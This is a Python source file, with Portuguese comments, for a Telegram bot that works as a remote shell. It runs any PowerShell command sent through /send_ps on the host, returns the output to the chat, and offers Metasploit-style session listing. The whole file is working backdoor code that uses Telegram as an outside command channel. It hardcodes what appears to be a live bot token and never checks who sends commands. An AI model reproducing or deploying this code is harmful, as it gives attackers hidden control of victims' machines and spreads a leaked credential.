import subprocess
from telegram.ext import Updater, CommandHandler

class BotConfig:
    def __init__(self):
        self.TOKEN = '6751789637:AAEkj5uYA2UO_uodc8c0AV6SvhVJYXykntY'
        self.GRUPO_CHAT_ID = '5316711625'

config = BotConfig()

# Lista para armazenar informações sobre as sessões em execução
active_sessions = []
# Contador para atribuir IDs únicos às sessões
session_counter = 0

# Função para executar comandos PowerShell
def execute_powershell_command(command):
    try:
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
        output = result.stdout.strip()  # Remove espaços em branco extras
        # Divide a saída em partes menores (cada parte com 4096 caracteres ou menos)
        parts = [output[i:i+4096] for i in range(0, len(output), 4096)]
        return parts
    except Exception as e:
        return [str(e)]

# Função para listar sessões em execução
def list_sessions(update, context):
    if not active_sessions:
        update.message.reply_text("Não há sessões em execução.")
    else:
        session_info = "\n".join(active_sessions)
        update.message.reply_text("Sessões em execução:\n" + session_info)

# Função para deixar uma sessão em segundo plano
def background_session(update, context):
    global session_counter
    command = " ".join(context.args)
    if not command:
        update.message.reply_text("Por favor, forneça as informações da sessão para deixar em segundo plano.")
        return

    session_counter += 1
    session_info = f"Sessão {session_counter}: {command}"
    active_sessions.append(session_info)
    update.message.reply_text(f"Sessão deixada em segundo plano: {session_info}")

# Função para enviar o comando PowerShell
def send_ps_command(update, context):
    command = " ".join(context.args)
    if not command:
        update.message.reply_text("Por favor, forneça um comando para enviar.")
        return

    # Executa o comando recebido no PowerShell
    command_results = execute_powershell_command(command)

    # Envia cada parte da saída como uma mensagem separada
    for part in command_results:
        update.message.reply_text(part)

# Função para exibir o menu
def show_menu(update, context):
    menu_text = "Opções do Menu:\n" \
                "/send_ps - Enviar um comando PowerShell\n" \
                "/list - Listar sessões em execução\n" \
                "/background - Deixar uma sessão em segundo plano\n"
    update.message.reply_text(menu_text)

def main():
    # Inicializa o bot do Telegram
    updater = Updater(token=config.TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Adiciona um manipulador de comando para o comando /send_ps
    dispatcher.add_handler(CommandHandler("send_ps", send_ps_command))

    # Adiciona um manipulador de comando para o comando /list
    dispatcher.add_handler(CommandHandler("list", list_sessions))

    # Adiciona um manipulador de comando para o comando /background
    dispatcher.add_handler(CommandHandler("background", background_session))

    # Adiciona um manipulador de comando para o comando /menu
    dispatcher.add_handler(CommandHandler("menu", show_menu))

    try:
        # Inicia o bot do Telegram
        updater.start_polling()

        # Mantém o bot em execução
        updater.idle()
    except Exception as e:
        print("Ocorreu um erro:", e)

if __name__ == '__main__':
    main()
